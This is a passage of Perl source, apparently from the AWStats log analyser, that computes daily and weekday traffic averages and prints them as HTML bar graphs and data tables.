\"%.2f\", $AverageVisits );\n    $average_p = sprintf( \"%.2f\", $AveragePages );\n    $average_h = sprintf( \"%.2f\", $AverageHits );\n    $average_k = sprintf( \"%.2f\", $AverageBytes );\n\n\t# Show bars for day\n\tmy $graphdone=0;\n\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t{\n\t\tmy @blocklabel = ();\n\t\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $bold =\n\t\t\t  (      $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear ? ':' : '' );\n\t\t\tmy $weekend =\n\t\t\t  ( DayOfWeek( $day, $month, $year ) =~ /[06]/ ? '!' : '' );\n\t\t\tpush @blocklabel,\n\t\t\t  \"$day\\n$MonthNumLib{$month}$weekend$bold\";\n\t\t}\n\t\tmy @vallabel = (\n\t\t\t\"$Message[10]\", \"$Message[56]\",\n\t\t\t\"$Message[57]\", \"$Message[75]\"\n\t\t);\n\t\tmy @valcolor =\n\t\t  ( \"$color_v\", \"$color_p\", \"$color_h\", \"$color_k\" );\n\t\tmy @valmax   = ( $max_v,   $max_h,   $max_h,   $max_k );\n\t\tmy @valtotal = ( $total_v, $total_p, $total_h, $total_k );\n\t\tmy @valaverage =\n\t\t  ( $average_v, $average_p, $average_h, $average_k );\n\t\tmy @valdata = ();\n\t\tmy $xx      = 0;\n\n\t\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\t$valdata[ $xx++ ] = $DayVisits{ $year . $month . $day }\n\t\t\t  || 0;\n\t\t\t$valdata[ $xx++ ] = $DayPages{ $year . $month . $day } || 0;\n\t\t\t$valdata[ $xx++ ] = $DayHits{ $year . $month . $day }  || 0;\n\t\t\t$valdata[ $xx++ ] = $DayBytes{ $year . $month . $day } || 0;\n\t\t}\n\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t&$function(\n\t\t\t\"$title\",              \"daysofmonth\",\n\t\t\t$ShowDaysOfMonthStats, \\@blocklabel,\n\t\t\t\\@vallabel,            \\@valcolor,\n\t\t\t\\@valmax,              \\@valtotal,\n\t\t\t\\@valaverage,          \\@valdata\n\t\t);\n\t\t$graphdone=1;\n\t}\n\t# If graph was not printed by a plugin\n\tif (! $graphdone) {\n\t\tprint \"<table>\\n\";\n\t\tprint \"<tr valign=\\\"bottom\\\">\\n\";\n\t\tforeach my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $bredde_v = 0;\n\t\t\tmy $bredde_p = 0;\n\t\t\tmy $bredde_h = 0;\n\t\t\tmy $bredde_k = 0;\n\t\t\tif ( $max_v > 0 ) {\n\t\t\t\t$bredde_v =\n\t\t\t\t  int( ( $DayVisits{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_v * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_p =\n\t\t\t\t  int( ( $DayPages{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t$bredde_h =\n\t\t\t\t  int( ( $DayHits{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_h * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t$bredde_k =\n\t\t\t\t  int( ( $DayBytes{ $year . $month . $day } || 0 ) /\n\t\t\t\t\t  $max_k * $BarHeight ) + 1;\n\t\t\t}\n\t\t\tprint \"<td>\";\n\t\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vv'}\\\" height=\\\"$bredde_v\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[10]: \"\n\t\t\t\t\t  . int( $DayVisits{ $year . $month . $day } || 0 )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[56]: \"\n\t\t\t\t\t  . int( $DayPages{ $year . $month . $day } || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle( \"$Message[57]: \"\n\t\t\t\t\t  . int( $DayHits{ $year . $month . $day } || 0 ) )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"4\\\"\"\n\t\t\t\t  . AltTitle(\n\t\t\t\t\t\"$Message[75]: \"\n\t\t\t\t\t  . Format_Bytes(\n\t\t\t\t\t\t$DayBytes{ $year . $month . $day }\n\t\t\t\t\t  )\n\t\t\t\t  )\n\t\t\t\t  . \" />\";\n\t\t\t}\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"<td>&nbsp;</td>\";\n\n\t\t# Show average value bars\n\t\tprint \"<td>\";\n\t\tmy $bredde_v = 0;\n\t\tmy $bredde_p = 0;\n\t\tmy $bredde_h = 0;\n\t\tmy $bredde_k = 0;\n\t\tif ( $max_v > 0 ) {\n\t\t\t$bredde_v = int( $average_v / $max_v * $BarHeight ) + 1;\n\t\t}\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_p = int( $average_p / $max_h * $BarHeight ) + 1;\n\t\t}\n\t\tif ( $max_h > 0 ) {\n\t\t\t$bredde_h = int( $average_h / $max_h * $BarHeight ) + 1;\n\t\t}\n\t\tif ( $max_k > 0 ) {\n\t\t\t$bredde_k = int( $average_k / $max_k * $BarHeight ) + 1;\n\t\t}\n\t\t$average_v = sprintf( \"%.2f\", $average_v );\n\t\t$average_p = sprintf( \"%.2f\", $average_p );\n\t\t$average_h = sprintf( \"%.2f\", $average_h );\n\t\t$average_k = sprintf( \"%.2f\", $average_k );\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vv'}\\\" height=\\\"$bredde_v\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[10]: $average_v\") . \" />\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[56]: $average_p\") . \" />\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[57]: $average_h\") . \" />\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"4\\\"\"\n\t\t\t  . AltTitle(\"$Message[75]: $average_k\") . \" />\";\n\t\t}\n\t\tprint \"</td>\\n\";\n\t\tprint \"</tr>\\n\";\n\n\t\t# Show lib for day\n\t\tprint \"<tr valign=\\\"middle\\\">\";\n\t\tforeach\n\t\t  my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $dayofweekcursor = DayOfWeek( $day, $month, $year );\n\t\t\tprint \"<td\"\n\t\t\t  . (\n\t\t\t\t$dayofweekcursor =~ /[06]/\n\t\t\t\t? \" bgcolor=\\\"#$color_weekend\\\"\"\n\t\t\t\t: \"\"\n\t\t\t  )\n\t\t\t  . \">\";\n\t\t\tprint(\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t);\n\t\t\tprint \"$day<br /><span style=\\\"font-size: \"\n\t\t\t  . (    $FrameName ne 'mainright'\n\t\t\t\t  && $QueryString !~ /buildpdf/i ? \"9\" : \"8\" )\n\t\t\t  . \"px;\\\">\"\n\t\t\t  . $MonthNumLib{$month}\n\t\t\t  . \"</span>\";\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\\n\";\n\t\t}\n\t\tprint \"<td>&nbsp;</td>\";\n\t\tprint \"<td valign=\\\"middle\\\"\"\n\t\t  . Tooltip(18)\n\t\t  . \">$Message[96]</td>\\n\";\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n\";\n\t}\n\tprint \"<br />\\n\";\n\n\t# Show data array for days\n\tif ($AddDataArrayShowDaysOfMonthStats) {\n\t\tprint \"<table>\\n\";\n\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[4]</td>\";\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_v\\\"\"\n\t\t\t  . Tooltip(1)\n\t\t\t  . \">$Message[10]</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t  . Tooltip(3)\n\t\t\t  . \">$Message[56]</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_h\\\"\"\n\t\t\t  . Tooltip(4)\n\t\t\t  . \">$Message[57]</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_k\\\"\"\n\t\t\t  . Tooltip(5)\n\t\t\t  . \">$Message[75]</td>\";\n\t\t}\n\t\tprint \"</tr>\";\n\t\tforeach\n\t\t  my $daycursor ( $firstdaytoshowtime .. $lastdaytoshowtime )\n\t\t{\n\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\tmy $year  = $1;\n\t\t\tmy $month = $2;\n\t\t\tmy $day   = $3;\n\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\tnext;\n\t\t\t}    # If not an existing day, go to next\n\t\t\tmy $dayofweekcursor = DayOfWeek( $day, $month, $year );\n\t\t\tprint \"<tr\"\n\t\t\t  . (\n\t\t\t\t$dayofweekcursor =~ /[06]/\n\t\t\t\t? \" bgcolor=\\\"#$color_weekend\\\"\"\n\t\t\t\t: \"\"\n\t\t\t  )\n\t\t\t  . \">\";\n\t\t\tprint \"<td>\"\n\t\t\t  . (\n\t\t\t\t!$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear\n\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t: ''\n\t\t\t  );\n\t\t\tprint Format_Date( \"$year$month$day\" . \"000000\", 2 );\n\t\t\tprint(   !$StaticLinks\n\t\t\t\t  && $day == $nowday\n\t\t\t\t  && $month == $nowmonth\n\t\t\t\t  && $year == $nowyear ? '</span>' : '' );\n\t\t\tprint \"</td>\";\n\t\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($DayVisits{ $year . $month . $day }\n\t\t\t\t  ? $DayVisits{ $year . $month . $day }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($DayPages{ $year . $month . $day }\n\t\t\t\t  ? $DayPages{ $year . $month . $day }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Number($DayHits{ $year . $month . $day }\n\t\t\t\t  ? $DayHits{ $year . $month . $day }\n\t\t\t\t  : \"0\"), \"</td>\";\n\t\t\t}\n\t\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\t\tprint \"<td>\",\n\t\t\t\t  Format_Bytes(\n\t\t\t\t\tint( $DayBytes{ $year . $month . $day } || 0 ) ),\n\t\t\t\t  \"</td>\";\n\t\t\t}\n\t\t\tprint \"</tr>\\n\";\n\t\t}\n\n\t\t# Average row\n\t\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><td>$Message[96]</td>\";\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint \"<td>\".Format_Number(int($average_v)).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number(int($average_p)).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number(int($average_h)).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint \"<td>\".Format_Bytes(int($average_k)).\"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\n\t\t# Total row\n\t\tprint\n\"<tr bgcolor=\\\"#$color_TableBGRowTitle\\\"><td>$Message[102]</td>\";\n\t\tif ( $ShowDaysOfMonthStats =~ /V/i ) {\n\t\t\tprint \"<td>\".Format_Number($total_v).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /P/i ) {\n\t\t\tprint \"<td>\".Format_Number($total_p).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /H/i ) {\n\t\t\tprint \"<td>\".Format_Number($total_h).\"</td>\";\n\t\t}\n\t\tif ( $ShowDaysOfMonthStats =~ /B/i ) {\n\t\t\tprint \"<td>\" . Format_Bytes($total_k) . \"</td>\";\n\t\t}\n\t\tprint \"</tr>\\n\";\n\t\tprint \"</table>\\n<br />\";\n\t}\n\n\tprint \"</center>\\n\";\n\tprint \"</td></tr>\\n\";\n\t&tab_end();\n}\n\n#------------------------------------------------------------------------------\n# Function:     Prints the Days of the Week section on the main page\n# Parameters:   $firstdaytocountaverage, $lastdaytocountaverage\n# Input:        _\n# Output:       HTML\n# Return:       -\n#------------------------------------------------------------------------------\nsub HTMLMainDaysofWeek{\n\tmy $firstdaytocountaverage = shift;\n\tmy $lastdaytocountaverage = shift;\n    my $NewLinkParams = shift;\n    my $NewLinkTarget = shift;\t\n    \n\tif ($Debug) { debug( \"ShowDaysOfWeekStats\", 2 ); }\n\t\t\tprint \"$Center<a name=\\\"daysofweek\\\">&nbsp;</a><br />\\n\";\n\t\t\tmy $title = \"$Message[91]\";\n\t\t\t&tab_head( \"$title\", 18, 0, 'daysofweek' );\n\t\t\tprint \"<tr>\";\n\t\t\tprint \"<td align=\\\"center\\\">\";\n\t\t\tprint \"<center>\\n\";\n\n\t\t\tmy $max_h = my $max_k = 0;    # Start from 0 because can be lower than 1\n\t\t\t                        # Get average value for day of week\n\t\t\tmy @avg_dayofweek_nb = ();\n\t\t\tmy @avg_dayofweek_p  = ();\n\t\t\tmy @avg_dayofweek_h  = ();\n\t\t\tmy @avg_dayofweek_k  = ();\n\t\t\tforeach my $daycursor (\n\t\t\t\t$firstdaytocountaverage .. $lastdaytocountaverage )\n\t\t\t{\n\t\t\t\t$daycursor =~ /^(\\d\\d\\d\\d)(\\d\\d)(\\d\\d)/;\n\t\t\t\tmy $year  = $1;\n\t\t\t\tmy $month = $2;\n\t\t\t\tmy $day   = $3;\n\t\t\t\tif ( !DateIsValid( $day, $month, $year ) ) {\n\t\t\t\t\tnext;\n\t\t\t\t}    # If not an existing day, go to next\n\t\t\t\tmy $dayofweekcursor = DayOfWeek( $day, $month, $year );\n\t\t\t\t$avg_dayofweek_nb[$dayofweekcursor]\n\t\t\t\t  ++; # Increase number of day used to count for this day of week\n\t\t\t\t$avg_dayofweek_p[$dayofweekcursor] +=\n\t\t\t\t  ( $DayPages{$daycursor} || 0 );\n\t\t\t\t$avg_dayofweek_h[$dayofweekcursor] +=\n\t\t\t\t  ( $DayHits{$daycursor} || 0 );\n\t\t\t\t$avg_dayofweek_k[$dayofweekcursor] +=\n\t\t\t\t  ( $DayBytes{$daycursor} || 0 );\n\t\t\t}\n\t\t\tfor (@DOWIndex) {\n\t\t\t\tif ( $avg_dayofweek_nb[$_] ) {\n\t\t\t\t\t$avg_dayofweek_p[$_] =\n\t\t\t\t\t  $avg_dayofweek_p[$_] / $avg_dayofweek_nb[$_];\n\t\t\t\t\t$avg_dayofweek_h[$_] =\n\t\t\t\t\t  $avg_dayofweek_h[$_] / $avg_dayofweek_nb[$_];\n\t\t\t\t\t$avg_dayofweek_k[$_] =\n\t\t\t\t\t  $avg_dayofweek_k[$_] / $avg_dayofweek_nb[$_];\n\n\t\t  #if ($avg_dayofweek_p[$_] > $max_p) { $max_p = $avg_dayofweek_p[$_]; }\n\t\t\t\t\tif ( $avg_dayofweek_h[$_] > $max_h ) {\n\t\t\t\t\t\t$max_h = $avg_dayofweek_h[$_];\n\t\t\t\t\t}\n\t\t\t\t\tif ( $avg_dayofweek_k[$_] > $max_k ) {\n\t\t\t\t\t\t$max_k = $avg_dayofweek_k[$_];\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\t$avg_dayofweek_p[$_] = \"?\";\n\t\t\t\t\t$avg_dayofweek_h[$_] = \"?\";\n\t\t\t\t\t$avg_dayofweek_k[$_] = \"?\";\n\t\t\t\t}\n\t\t\t}\n\n\t\t\t# Show bars for days of week\n\t\t\tmy $graphdone=0;\n\t\t\tforeach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )\n\t\t\t{\n\t\t\t\tmy @blocklabel = ();\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tpush @blocklabel,\n\t\t\t\t\t  ( $Message[ $_ + 84 ] . ( $_ =~ /[06]/ ? \"!\" : \"\" ) );\n\t\t\t\t}\n\t\t\t\tmy @vallabel =\n\t\t\t\t  ( \"$Message[56]\", \"$Message[57]\", \"$Message[75]\" );\n\t\t\t\tmy @valcolor = ( \"$color_p\", \"$color_h\", \"$color_k\" );\n\t\t\t\tmy @valmax = ( int($max_h), int($max_h), int($max_k) );\n\t\t\t\tmy @valtotal = ( $TotalPages, $TotalHits, $TotalBytes );\n\t\t\t\t# TEMP\n\t\t\t\tmy $average_p = my $average_h = my $average_k = 0;\n\t\t\t\t$average_p = sprintf( \"%.2f\", $AveragePages );\n\t\t\t\t$average_h = sprintf( \"%.2f\", $AverageHits );\n\t\t\t\t$average_k = (\n\t\t\t\t\tint($average_k)\n\t\t\t\t\t? Format_Bytes( sprintf( \"%.2f\", $AverageBytes ) )\n\t\t\t\t\t: \"0.00\"\n\t\t\t\t);\n\t\t\t\tmy @valaverage = ( $average_p, $average_h, $average_k );\n\t\t\t\tmy @valdata    = ();\n\t\t\t\tmy $xx         = 0;\n\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\t$valdata[ $xx++ ] = $avg_dayofweek_p[$_] || 0;\n\t\t\t\t\t$valdata[ $xx++ ] = $avg_dayofweek_h[$_] || 0;\n\t\t\t\t\t$valdata[ $xx++ ] = $avg_dayofweek_k[$_] || 0;\n\n\t\t\t\t\t# Round to be ready to show array\n\t\t\t\t\t$avg_dayofweek_p[$_] =\n\t\t\t\t\t  sprintf( \"%.2f\", $avg_dayofweek_p[$_] );\n\t\t\t\t\t$avg_dayofweek_h[$_] =\n\t\t\t\t\t  sprintf( \"%.2f\", $avg_dayofweek_h[$_] );\n\t\t\t\t\t$avg_dayofweek_k[$_] =\n\t\t\t\t\t  sprintf( \"%.2f\", $avg_dayofweek_k[$_] );\n\n\t\t\t\t\t# Remove decimal part that are .0\n\t\t\t\t\tif ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );\n\t\t\t\t\t}\n\t\t\t\t\tif ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tmy $function = \"ShowGraph_$pluginname\";\n\t\t\t\t&$function(\n\t\t\t\t\t\"$title\",             \"daysofweek\",\n\t\t\t\t\t$ShowDaysOfWeekStats, \\@blocklabel,\n\t\t\t\t\t\\@vallabel,           \\@valcolor,\n\t\t\t\t\t\\@valmax,             \\@valtotal,\n\t\t\t\t\t\\@valaverage,         \\@valdata\n\t\t\t\t);\n\t\t\t\t$graphdone=1;\n\t\t\t}\n\t\t\tif (! $graphdone) \n\t\t\t{\n\t\t\t\tprint \"<table>\\n\";\n\t\t\t\tprint \"<tr valign=\\\"bottom\\\">\\n\";\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tmy $bredde_p = 0;\n\t\t\t\t\tmy $bredde_h = 0;\n\t\t\t\t\tmy $bredde_k = 0;\n\t\t\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t\t\t$bredde_p = int(\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t  $avg_dayofweek_p[$_] ne '?'\n\t\t\t\t\t\t\t\t? $avg_dayofweek_p[$_]\n\t\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t\t) / $max_h * $BarHeight\n\t\t\t\t\t\t) + 1;\n\t\t\t\t\t}\n\t\t\t\t\tif ( $max_h > 0 ) {\n\t\t\t\t\t\t$bredde_h = int(\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t  $avg_dayofweek_h[$_] ne '?'\n\t\t\t\t\t\t\t\t? $avg_dayofweek_h[$_]\n\t\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t\t) / $max_h * $BarHeight\n\t\t\t\t\t\t) + 1;\n\t\t\t\t\t}\n\t\t\t\t\tif ( $max_k > 0 ) {\n\t\t\t\t\t\t$bredde_k = int(\n\t\t\t\t\t\t\t(\n\t\t\t\t\t\t\t\t  $avg_dayofweek_k[$_] ne '?'\n\t\t\t\t\t\t\t\t? $avg_dayofweek_k[$_]\n\t\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t\t) / $max_k * $BarHeight\n\t\t\t\t\t\t) + 1;\n\t\t\t\t\t}\n\t\t\t\t\t$avg_dayofweek_p[$_] = sprintf(\n\t\t\t\t\t\t\"%.2f\",\n\t\t\t\t\t\t(\n\t\t\t\t\t\t\t  $avg_dayofweek_p[$_] ne '?'\n\t\t\t\t\t\t\t? $avg_dayofweek_p[$_]\n\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t)\n\t\t\t\t\t);\n\t\t\t\t\t$avg_dayofweek_h[$_] = sprintf(\n\t\t\t\t\t\t\"%.2f\",\n\t\t\t\t\t\t(\n\t\t\t\t\t\t\t  $avg_dayofweek_h[$_] ne '?'\n\t\t\t\t\t\t\t? $avg_dayofweek_h[$_]\n\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t)\n\t\t\t\t\t);\n\t\t\t\t\t$avg_dayofweek_k[$_] = sprintf(\n\t\t\t\t\t\t\"%.2f\",\n\t\t\t\t\t\t(\n\t\t\t\t\t\t\t  $avg_dayofweek_k[$_] ne '?'\n\t\t\t\t\t\t\t? $avg_dayofweek_k[$_]\n\t\t\t\t\t\t\t: 0\n\t\t\t\t\t\t)\n\t\t\t\t\t);\n\n\t\t\t\t\t# Remove decimal part that are .0\n\t\t\t\t\tif ( $avg_dayofweek_p[$_] == int( $avg_dayofweek_p[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_p[$_] = int( $avg_dayofweek_p[$_] );\n\t\t\t\t\t}\n\t\t\t\t\tif ( $avg_dayofweek_h[$_] == int( $avg_dayofweek_h[$_] ) ) {\n\t\t\t\t\t\t$avg_dayofweek_h[$_] = int( $avg_dayofweek_h[$_] );\n\t\t\t\t\t}\n\t\t\t\t\tprint \"<td valign=\\\"bottom\\\">\";\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /P/i ) {\n\t\t\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vp'}\\\" height=\\\"$bredde_p\\\" width=\\\"6\\\"\"\n\t\t\t\t\t\t  . AltTitle(\"$Message[56]: $avg_dayofweek_p[$_]\")\n\t\t\t\t\t\t  . \" />\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /H/i ) {\n\t\t\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vh'}\\\" height=\\\"$bredde_h\\\" width=\\\"6\\\"\"\n\t\t\t\t\t\t  . AltTitle(\"$Message[57]: $avg_dayofweek_h[$_]\")\n\t\t\t\t\t\t  . \" />\";\n\t\t\t\t\t}\n\t\t\t\t\tif ( $ShowDaysOfWeekStats =~ /B/i ) {\n\t\t\t\t\t\tprint\n\"<img align=\\\"bottom\\\" src=\\\"$DirIcons\\/other\\/$BarPng{'vk'}\\\" height=\\\"$bredde_k\\\" width=\\\"6\\\"\"\n\t\t\t\t\t\t  . AltTitle( \"$Message[75]: \"\n\t\t\t\t\t\t\t  . Format_Bytes( $avg_dayofweek_k[$_] ) )\n\t\t\t\t\t\t  . \" />\";\n\t\t\t\t\t}\n\t\t\t\t\tprint \"</td>\\n\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n\";\n\t\t\t\tprint \"<tr\" . Tooltip(17) . \">\\n\";\n\t\t\t\tfor (@DOWIndex) {\n\t\t\t\t\tprint \"<td\"\n\t\t\t\t\t  . ( $_ =~ /[06]/ ? \" bgcolor=\\\"#$color_weekend\\\"\" : \"\" )\n\t\t\t\t\t  . \">\"\n\t\t\t\t\t  . (\n\t\t\t\t\t\t!$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear\n\t\t\t\t\t\t? '<span class=\"currentday\">'\n\t\t\t\t\t\t: ''\n\t\t\t\t\t  );\n\t\t\t\t\tprint $Message[ $_ + 84 ];\n\t\t\t\t\tprint(   !$StaticLinks\n\t\t\t\t\t\t  && $_ == ( $nowwday - 1 )\n\t\t\t\t\t\t  && $MonthRequired == $nowmonth\n\t\t\t\t\t\t  && $YearRequired == $nowyear ? '</span>' : '' );\n\t\t\t\t\tprint \"</td>\";\n\t\t\t\t}\n\t\t\t\tprint \"</tr>\\n</table>\\n\";\n\t\t\t}\n\t\t\tprint \"<br />\\n\";\n\n\t\t\t# Show data array for days of week\n\t\t\tif ($AddDataArrayShowDaysOfWeekStats) {\n\t\t\t\tprint \"<table>\\n\";\n\t\t\t\tprint\n\"<tr><td width=\\\"80\\\" bgcolor=\\\"#$color_TableBGRowTitle\\\">$Message[4]</td>\";\n\t\t\t\tif ( $ShowDaysOfWeekStats =~ /P/i ) {\n\t\t\t\t\tprint \"<td width=\\\"80\\\" bgcolor=\\\"#$color_p\\\"\"\n\t\t\t\t\t  . 